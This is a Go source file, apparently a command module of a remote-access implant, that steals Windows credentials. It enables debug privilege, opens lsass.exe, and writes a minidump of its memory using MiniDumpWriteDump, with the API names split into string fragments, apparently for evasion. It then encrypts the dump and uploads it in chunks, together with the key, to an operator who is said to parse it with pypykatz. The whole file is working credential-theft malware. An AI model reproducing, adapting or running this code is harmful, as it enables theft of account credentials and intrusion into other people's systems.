package commands

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows"
)

var (
	modDbgHelpStr    = strings.Join([]string{"dbg", "help", ".dll"}, "")
	procDumpStr      = strings.Join([]string{"Mini", "Dump", "Write", "Dump"}, "")
	modDbgHelp       = windows.NewLazySystemDLL(modDbgHelpStr)
	procMiniDumpW    = modDbgHelp.NewProc(procDumpStr)
)

var reportDataFn func(int, []byte)

func SetDumpOutputFn(fn func(int, []byte)) {
	reportDataFn = fn
}

func DumpCredentials() ([]byte, error) {
	fmt.Println("[mimikatz] Starting credential dump")

	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return nil, fmt.Errorf("SeDebugPrivilege: %w", err)
	}

	pid, err := findPidByName("lsass.exe")
	if err != nil {
		return nil, fmt.Errorf("lsass.exe not found: %w", err)
	}
	fmt.Printf("[mimikatz] LSASS PID: %d\n", pid)

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE,
		false, pid)
	if err != nil {
		hProcess, err = windows.OpenProcess(
			windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ|0x0040,
			false, pid)
		if err != nil {
			return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
		}
	}
	defer windows.CloseHandle(hProcess)

	dumpTmp := filepath.Join(os.TempDir(), fmt.Sprintf("dmp_%d.tmp", time.Now().UnixNano()))
	defer os.Remove(dumpTmp)

	fName, _ := windows.UTF16PtrFromString(dumpTmp)
	fHandle, err := windows.CreateFile(fName,
		windows.GENERIC_WRITE, windows.FILE_SHARE_WRITE, nil,
		windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return nil, fmt.Errorf("CreateFile dump: %w", err)
	}

	fmt.Println("[mimikatz] Dumping LSASS (60s timeout)...")

	var closed bool
	done := make(chan error, 1)
	go func() {
		r1, _, _ := procMiniDumpW.Call(
			uintptr(hProcess), uintptr(pid),
			uintptr(fHandle), uintptr(0x00000002), 0, 0, 0)
		if !closed {
			windows.Close(fHandle)
		}
		if r1 == 0 {
			done <- fmt.Errorf("MiniDumpWriteDump failed")
		} else {
			done <- nil
		}
	}()

	select {
	case err := <-done:
		if err != nil {
			return nil, err
		}
	case <-time.After(60 * time.Second):
		closed = true
		windows.Close(fHandle)
		return nil, fmt.Errorf("minidump timed out (60s)")
	}

	dumpData, err := os.ReadFile(dumpTmp)
	if err != nil {
		return nil, fmt.Errorf("read dump: %w", err)
	}
	if len(dumpData) < 100 {
		return nil, fmt.Errorf("dump too small: %d bytes", len(dumpData))
	}
	fmt.Printf("[mimikatz] Dump: %d bytes\n", len(dumpData))

	key := make([]byte, 32)
	rand.Read(key)
	nonce := make([]byte, 12)
	rand.Read(nonce)
	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	encrypted := aesgcm.Seal(nil, nonce, dumpData, nil)
	encrypted = append(nonce, encrypted...)

	dumpPath := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_%d.bin", pid))
	os.WriteFile(dumpPath, encrypted, 0600)
	keyB64 := base64.StdEncoding.EncodeToString(key)

	fmt.Printf("[mimikatz] Uploading %d bytes asynchronously...\n", len(encrypted))

	if reportDataFn != nil {
		reportDataFn(45, append([]byte{1}, []byte(keyB64)...))
		const cs = 512 * 1024
		go func() {
			for i := 0; i < len(encrypted); i += cs {
				end := i + cs
				if end > len(encrypted) {
					end = len(encrypted)
				}
				reportDataFn(45, append([]byte{2}, encrypted[i:end]...))
				time.Sleep(5 * time.Millisecond)
			}
			reportDataFn(45, []byte{3})
			os.Remove(dumpPath)
		}()
	}

	var b bytes.Buffer
	b.WriteString("[+] LSASS dump captured and uploaded\n")
	b.WriteString(fmt.Sprintf("[+] Size: %d bytes\n", len(dumpData)))
	b.WriteString("[+] Server processing with pypykatz\n")
	return b.Bytes(), nil
}
